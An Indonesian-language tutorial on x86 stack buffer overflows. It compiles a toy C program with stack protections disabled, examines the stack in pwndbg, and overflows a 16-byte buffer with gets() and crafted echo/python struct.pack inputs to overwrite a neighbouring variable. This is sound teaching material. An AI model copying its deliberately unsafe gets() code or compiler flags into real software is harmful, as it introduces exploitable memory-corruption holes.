# 2. Binary exploitation - konsep buffer overflow x86

### buffer.c
```c
#include <stdio.h>
#include <string.h>

void print(char a, int b, char c[]) {
    printf("a = %c", a);
    printf("b = %d", b);
    printf("c = %s", c);
}

int main(int argc, char **argv){
    char a;
    int b;
    char c[16];

    a = 'A';
    b = 0xd3c0d3; // desimal dari -> 13877459
    strcpy(c, "batagor");
    print(a, b, c);
    return 0;
}

// compile with :
// gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 buffer.c -o buffer32

// explain :
// -fno-builtin -> biar strcpu jadi builtin
// -mpreferred-stack-boundary=2 -> biar operasi stack gadibikin aneh2 sama gcc
```

## check main func
```c
pwndbg> disas main
Dump of assembler code for function main:
   0x080491b7 <+0>:	push   ebp
   0x080491b8 <+1>:	mov    ebp,esp
   0x080491ba <+3>:	sub    esp,0x18
   0x080491bd <+6>:	mov    BYTE PTR [ebp-0x1],0x41
   0x080491c1 <+10>:	mov    DWORD PTR [ebp-0x8],0xd3c0d3
   0x080491c8 <+17>:	push   0x804a01d
   0x080491cd <+22>:	lea    eax,[ebp-0x18]
   0x080491d0 <+25>:	push   eax
   0x080491d1 <+26>:	call   0x8049050 <strcpy@plt>
   0x080491d6 <+31>:	add    esp,0x8
   0x080491d9 <+34>:	movsx  eax,BYTE PTR [ebp-0x1]
   0x080491dd <+38>:	lea    edx,[ebp-0x18]
   0x080491e0 <+41>:	push   edx
   0x080491e1 <+42>:	push   DWORD PTR [ebp-0x8]
   0x080491e4 <+45>:	push   eax
   0x080491e5 <+46>:	call   0x8049176 <print>
   0x080491ea <+51>:	add    esp,0xc
   0x080491ed <+54>:	mov    eax,0x0
   0x080491f2 <+59>:	leave
   0x080491f3 <+60>:	ret
End of assembler dump.

pwndbg> break *main
pwndbg> r
pwndbg> si, si si terus dan analisis
```
- nanti stacknya gini :
```c
00:0000│ esp 0xffffcdbc —▸ 0x804a01d ◂— 'batagor' -> variabel c
01:0004│-018 0xffffcdc0 ◂— 0
... ↓        3 skipped
05:0014│-008 0xffffcdd0 ◂— 0xd3c0d3 -> variabel b 
06:0018│-004 0xffffcdd4 ◂— 0x41000000 -> variabel a
07:001c│ ebp 0xffffcdd8 ◂— 0
```

### identify
- 00:0000│ esp 0xffffcdbc —▸ 0x804a01d ◂— 'batagor' -> variabel c
di stack ini dia di namakan buffer kotak kosong yang di isi:
b a t a g o r \0 -> sisanya kotak kosong
- 8/16 slot dari kotak kosong -> char c [16]


## Experiment

### Masih muat
- coba ganti string variabel c nya jadi cybersecurity:
- compile ulang
- run ulang:
- langsung jump aja di proses setelah strcpy 
```c
strcpy(c, "cybersecurity");
pwndbg> disas main
pwndbg> break *main+34
pwndbg> run

00:0000│ eax edx esp 0xffffcdc0 ◂— 'cybersecurity'
01:0004│-014         0xffffcdc4 ◂— 'rsecurity'
02:0008│-010         0xffffcdc8 ◂— 'urity'
03:000c│-00c         0xffffcdcc ◂— 0x79 /* 'y' */
04:0010│-008         0xffffcdd0 ◂— 0xd3c0d3 // ini
05:0014│-004         0xffffcdd4 ◂— 0x41000000
06:0018│ ebp         0xffffcdd8 ◂— 0
07:001c│+004         0xffffcddc —▸ 0xf7c24cc3 ◂— add esp, 0x10
```

### tertimpa - timpa teks aokwokwo
- jadi muat buffer 16 tadi jadi gini:
```
c y b e r s e c u r i t y \0 -> 14/16
```
- sekarang coba string nya di penuhin
```
c y b e r s e c u r i t y 1 2 3 -> 16/16
```
- \0 nya kemana, dia nimpa di variabel b
- yangg awalnya gini 0xd3c0d3 jadi: 0x00c0d3
- ini yang dinamakan: buffer overflow
- coba ubah jadi penuh gitu sekarang variabel c nya
```c
00:0000│ eax esp edx-3 0xffffcdc0 ◂— 'cybersecurity123'
01:0004│-014           0xffffcdc4 ◂— 'rsecurity123'
02:0008│-010           0xffffcdc8 ◂— 'urity123'
03:000c│-00c           0xffffcdcc ◂— 'y123'
04:0010│-008           0xffffcdd0 ◂— 0xd3c000 // ini
05:0014│-004           0xffffcdd4 ◂— 0x41000000
06:0018│ ebp           0xffffcdd8 ◂— 0
07:001c│+004           0xffffcddc —▸ 0xf7c24cc3 ◂— add esp, 0x10

```
- nah kan 0xd3c0d3 nya jadi 0xd3c000
- d3 nya ketimpa 00

### ter override

- coba sekarang variabel c nya ditambah lagi :
```
c y b e r s e c u r i t y 1 2 3 h a h -> 19/16
```
- d3c0d3 bakal ketimpa jadi: 68 61 68 00 atau h a h \0

```c
00:0000│ eax esp 0xffffcdc0 ◂— 'cybersecurity123hah'
01:0004│-014     0xffffcdc4 ◂— 'rsecurity123hah'
02:0008│-010     0xffffcdc8 ◂— 'urity123hah'
03:000c│-00c     0xffffcdcc ◂— 'y123hah' // variabel C
04:0010│ edx-3   0xffffcdd0 ◂— 0x686168 /* 'hah' */  // variabel B ketimpa
05:0014│-004     0xffffcdd4 ◂— 0x41000000 // ini variabel A
06:0018│ ebp     0xffffcdd8 ◂— 0
07:001c│+004     0xffffcddc —▸ 0xf7c24cc3 ◂— add esp, 0x10
```
- nah sekarang coba convert hex ini ke decimal: 686168 = 6840680
- harusnya variabel b sekarang di isi: 6840680
- di pwndbg, ketik aja continue buat lanjut ngeprint

```c
pwndbg> continue
Continuing.
a = A b = 6840680 c = cybersecurity123hah[Inferior 1 (process 19988) exited normally]
pwndbg> 
-> atau:
a = A
b = 6840680
c = cybersecurity123hah
```

## Experiment 2
### jadi: buffer overflow bisa mengubah nilai variabel
- stack nya dari ESP -> EBP: lokal var A - C 
- sampai bagian return addr bisa ketimpa (biasa buat exploit)
- dan ini di isi lewat program: c = "cybersecurity123hah"
- nah biasanya juga bisa pake input user
```c
strcpy(c, "batagor"); diganti ke -> gets(&c);
```
- gets() ga aman karna ga cek apakah input kita muat di buffer
- karna di aturan gcc baru gets udah gabisa dipake, kasih param gini :
-Wno-implicit-function-declaration
- now run coba binary nya ./buffer32
real num: 13877459

### case 1
- input: AAAABBBBCCCCDDD /  aman masih 15/16 + \0 jadi = 16/16
- output:
```c 
a = A
b = 13877459
c = AAAABBBBCCCCDDDD
```
### case 2 
- input: AAAABBBBCCCCDDDDEEEE / 20/16 udah overflow
- output: 
```c 
a = A
b = 1162167621 // berubah kan
c = AAAABBBBCCCCDDDDEEEE
```
- tips: kalau misal gada interaktif input, bisa overflow pakai echo
```bash
echo "AAAABBBBCCCCDDDDEEEE" | ./buffer32
```

### case 3
- next coba ubah variabel b nilainya sesuai dengan kemauan
- misal: b = 1.500.000 -> 1500000
- convert dulu: decimal to hex: 1500000 -> 16E360
- isi semua kotak buffer di variabel B biar jadi gitu
- 16 E3 60 -> 60 E3 16 00, jadiin char 1 1 nya
- tapi ga semua nya bisa diketik di keyboard, bisa pakai echo 
```bash
60 E3 16 00
echo -e "AAAABBBBCCCCDDDD\x60\xe3\x16\x00" | ./buffer32
```
- -e buat parsing itu ke hex
- pakai python juga bisa :
```bash
python2 -c "print 'AAAABBBBCCCCDDDD\x60\xe3\x16\x00'" | ./buffer32
```
- combine stack buffer 16, biar paddingnya penuhin buffer
```bash
python -c "print 'A' * 16 + '\x60\xe3\x16\x00'" | ./buffer32
```
- buat file payload: 
```bash
echo -e "AAAABBBBCCCCDDDD\x60\xe3\x16\x00" > pelod.txt
./buffer32 < pelod.txt
```
- custom number di variabel b with python struct pack num to hex
```bash
python2 -c "import struct; print 'A' * 16 + struct.pack('<I', 2000)" | ./buffer32
a = A
b = 2000
c = AAAAAAAAAAAAAAAA
```